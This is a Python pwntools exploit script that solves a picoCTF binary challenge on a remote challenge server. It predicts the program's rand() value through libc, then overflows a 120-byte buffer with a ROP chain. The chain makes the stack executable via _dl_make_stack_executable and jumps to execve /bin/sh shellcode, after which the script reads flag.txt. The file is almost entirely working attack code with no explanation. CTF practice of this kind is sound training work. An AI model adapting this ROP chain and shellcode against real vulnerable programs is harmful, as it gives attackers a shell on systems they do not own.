import os; os.environ["TMPDIR"] = os.path.join(os.environ['HOME'], 'tmp')
import pwn
from ctypes import CDLL
#from struct import pack

host = "jupiter.challenges.picoctf.org"
port = 51462
target = "./vuln"


def must_guess(pr):

    res = 0
    while res != 1:
      for num in range(1, 100):
        pr.sendlineafter("What number would you like to guess?\n", str(num))
        res = pr.readline()
        if res != b'Nope!\n':
            print('the num is', num, res)
            res = 1
            break

def attack(remote):
    pr = None
    if remote:
        pr = pwn.remote(host, port)
    else:
        pr = pwn.process(target)

    try:
        libc = CDLL('libc.so.6')
        num = (libc.rand() % 100) + 1
        pr.sendlineafter("What number would you like to guess?\n", str(num))

        elf = pwn.ELF(target, False)
        rop = pwn.ROP(elf)
        payload = b'A'*120
        payload += pwn.p64(rop.find_gadget(['pop rdx', 'ret']).address)
        payload += pwn.p64(elf.sym['__stack_prot'])
        payload += pwn.p64(rop.find_gadget(['pop rax', 'ret']).address)
        payload += pwn.p64(7)                   # PROT_READ|PROT_WRITE|PROT_EXEC
        payload += pwn.p64(0x0000000000419127)  # can't find this gadget in pwn, using result from ``ROPgadget --binary ./vuln``
                                                # 0x0000000000419127 : mov qword ptr [rdx], rax ; ret
        payload += pwn.p64(rop.find_gadget(['pop rdi', 'ret']).address)
        payload += pwn.p64(elf.sym['__libc_stack_end'])
        payload += pwn.p64(elf.sym['_dl_make_stack_executable'])
        payload += pwn.p64(0x0000000000451974)  # can't find this gadget in pwn, using result from ``ROPgadget --binary ./vuln``
                                                # 0x0000000000451974 : push rsp ; ret

        # http://shell-storm.org/shellcode/files/shellcode-603.php
        shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
        payload += shellcode
        print('payload:', payload, 'len:', len(payload))

        pr.send(payload)
        pr.readuntil("New winner!\nName? ")
        pr.sendline()
        print(pr.readline())
        #pr.interactive()
        pr.sendline("cat flag.txt;")
        print('flag:', pr.readall(timeout=2).decode())

    except Exception as e:
        print(e)
    finally:
        pr.close()

attack(True)
